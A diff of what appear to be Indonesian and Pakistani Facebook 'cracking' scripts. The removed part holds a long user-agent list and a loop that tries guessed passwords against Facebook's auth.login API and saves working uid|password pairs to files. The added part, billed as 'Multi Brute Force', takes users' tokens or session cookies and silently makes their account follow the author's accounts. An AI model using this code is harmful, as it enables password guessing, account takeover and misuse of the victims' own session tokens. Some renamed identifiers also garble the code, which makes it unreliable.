-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
-
-  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
-
-  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
-
-  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
-
-  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
-
-  "DoCoMo/2.0 P903i",
-
-  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
-
-  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
-
-  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
-
-  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
-
-  "Mogujie4Android/NAMhuawei/1290",
-
-  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-
-  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
-
-  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
-
-  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
-
-  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-
-  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
-
-  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
-
-  "nokia-7.1-safari",
-
-  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
-
-  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
-
-  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
-
-  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
-
-  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-
-  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
-
-  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
-
-  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
-
-  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
-
-  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
-
-  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
-
-  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
-
-  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
-
-  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
-
-  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
-
-  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
-
-  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
-
-  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-
-  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
-
-  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
-
-  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
-
-  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
-
-  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
-
-  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
-
-  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
-
-  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
-
-  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
-
-  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
-
-  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
-
-  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
-
-  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
-
-  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
-
-  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
-
-  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
-
-			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-
-	])
-
-		sys.stdout.write(
-
-			"\r [彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 ]>%s/COUNT>%s -> OK:-%s - CP:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
-
-		); sys.stdout.flush()
-
-		for pw in pwx:
-
-			pw = pw.lower()
-
-			ses = requests.Session()
-
-			headers = {
-
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-
-				"x-fb-connection-quality": "EXCELLENT",
-
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-
-				"user-agent": rua, 
-
-				"content-type": "application/x-www-form-urlencoded", 
-
-				"x-fb-http-engine": "Liger"
-
-			}
-
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
-
-			if "session_key" in response.text and "EAAA" in response.text:
-
-				print("\r \033[0;92m[彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -Ok ] %s | %s\033[0;97m         "%(uid, pw))
-
-				print ("\r \033[0;92m Congrats ")
-
-				self.ok.append("%s|%s"%(uid, pw))
-
-				open("2009彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
-
-				break
-
-			elif "www.facebook.com" in response.json()["error_msg"]:
-
-				print("\r \033[0;93m[彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK] %s | %s\033[0;97m         "%(uid, pw))
-
-				self.cp.append("%s|%s"%(uid, pw))
-
-				open("2009彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK.txt","a").write(" %s | %s\n"%(uid, pw))
-
-				break
-
-			else:
-
-				continue
-
- 
-
-		self.loop +=1
-
- 
-
-if len(sys.argv) == 2:
-
-	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
-
-		helpnote()
-
-	else:
-
-		Main()
-
- 
-
-try:Main()
-
-except Exception as e:exit(str(e))
-
- 
-
-	
-
-	
+    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
+def mlaku(z):
+    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
+
+### Clear Terminal
+def clear():
+    if "linux" in sys.platform.lower():os.system("clear")
+    elif "win" in sys.platform.lower():os.system("cls")
+    else:os.system("clear")
+
+### Logo
+def banner():
+    _logo_line_1_ = ('%s   _______ __         ___'%(O))
+    _logo_line_2_ = ('%s  / __/ (_) /____ %s©  %s<  /  ╔═══════════════════════╗'%(O,P,O))
+    _logo_line_3_ = ('%s / _// / / __/ -_)   / /   ║  %sCoded By Dapunta AR  %s║'%(O,P,O))
+    _logo_line_4_ = ('%s/___/_/_/\__/\__/  _/ /_   ║    %s• XNSCODETEAM •    %s║'%(O,P,O))
+    _logo_line_5_ = ('%sMulti Brute Force %s/____/   ╚═══════════════════════╝'%(P,O))
+    _dapunta_cici_(_logo_line_1_)
+    _dapunta_cici_(_logo_line_2_)
+    _dapunta_cici_(_logo_line_3_)
+    _dapunta_cici_(_logo_line_4_)
+    _dapunta_cici_(_logo_line_5_+'\n')
+
+### Cek Cookies
+def cek_dev():
+    _isi_dev_ = _dapunta_dapunta_('cookies.txt','r').read()
+    if 'null' in _isi_dev_:jalan('%s╚══[%s!%s] %sCookies Invalid, Login Ulang Dengan Cookies'%(M,P,M,P));bersih();_cici_cici_()
+    else:pass
+
+### Bot Follow Jangan Diganti Anjink !
+def bot_follow(_tok_dev_):
+    try:
+        for _list_ in _my_account_:
+            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)
+            except:pass
+        _dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P));time.sleep(2)
+    except:pass
+    
+### Menu Login
+def menu_log():
+    bersih()
+    clear()
+    banner()
+    var_menu()
+    pmu = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
+    _dapunta_cici_('%s║'%(O))
+    if pmu in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
+    elif pmu in ['1','01','001','a']:
+        defaultua()
+        token = _cici_dapunta_('%s╚══[%s•%s] %sToken : '%(O,P,O,P))
+        try:
+            x = _req_get_("https://graph.facebook.com/me?access_token=" + token)
+            y = _js_lo_(x.text)
+            n = y['name']
+            xd = _dapunta_dapunta_("token.txt", "w")
+            xd.write(token)
+            xd.close()
+            xz = _dapunta_dapunta_('cookies.txt','w')
+            xz.write('null')
+            xz.close()
+            bot_follow(token)
+            menu()
+        except requests.exceptions.ConnectionError:
+            _dapunta_cici_('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
+            _cici_cici_()
+        except (KeyError,IOError):
+            _dapunta_cici_('%s║'%(O))
+            jalan('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
+            bersih()
+            menu_log()
+    elif pmu in ['2','02','002','b']:
+        defaultua()
+        cookie = _cici_dapunta_('%s╚══[%s•%s] %sCookies : '%(O,P,O,P))
+        with requests.Session() as xyz:
+            try:
+                get_tok = xyz.get(url_businness+'/business_locations',headers = {
+                    "user-agent":ua_business,
+                    "referer": web_fb,
+                    "host": "business.facebook.com",
+                    "origin": url_businness,
+                    "upgrade-insecure-requests" : "1",
+                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "cache-control": "max-age=0",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+                    "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
+                token = re.search("(EAAG\w+)", get_tok.text).group(1)
+                open('cookies.txt','w').write(cookie)
+                open('token.txt','w').write(token)
+                menu()
+            except requests.exceptions.ConnectionError:_dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()
+            except (KeyError,IOError,AttributeError):_dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sCookies Invalid'%(M,P,M,P));bersih();menu_log()
+    elif pmu in ['3','03','003','c']:
+        clear()
+        var_tutor()
+        pf = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P));_dapunta_cici_('%s║'%(O))
+        if pf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
+        elif pf in ['1','01','001','a']:os.system('xdg-_dapunta_dapunta_ https://youtu.be/iUfEGHXdQQM');_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
+        elif pf in ['2','02','002','b']:os.system('xdg-_dapunta_dapunta_ https://youtu.be/iUfEGHXdQQM');_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
+        elif pf in ['3','03','003','c']:os.system('xdg-_dapunta_dapunta_ https://youtu.be/9snR31AI_h8');tutor_target();_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
+        elif pf in ['4','04','004','d']:tutor_crack();_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
+        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
+    elif pmu in ['4','04','004','d']:
+        clear()
